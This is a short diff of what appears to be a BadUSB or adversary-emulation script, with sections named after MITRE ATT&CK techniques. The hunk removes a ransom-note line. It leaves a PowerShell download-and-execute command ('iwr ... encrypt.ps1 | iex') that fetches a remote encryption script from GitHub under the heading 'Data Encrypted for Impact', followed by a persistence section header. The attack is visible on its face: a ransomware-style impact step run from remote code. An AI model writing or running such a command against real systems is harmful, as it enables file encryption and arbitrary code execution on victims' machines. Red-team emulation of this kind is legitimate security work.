@@ -12,7 +12,7 @@
 ##T1565 Data Manipulation
 ##New-Item -Path "C:\Users\Leonardo\Desktop\new.txt" -ItemType File -Force
 ##Add-Content -Path "C:\Users\Leonardo\Desktop\new.txt" -Value "this is a file"
-##"Your files are encrypted! Generic Ransom thing here" | Out-File -FilePath ([environment]::GetFolderPath("UserProfile") + "\Downloads\test\README.txt")
+##
 ##T1486 Data Encrypted for Impact
 ##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/encrypt.ps1 | iex
 ##Persistance----------------------------------------------------------------------------
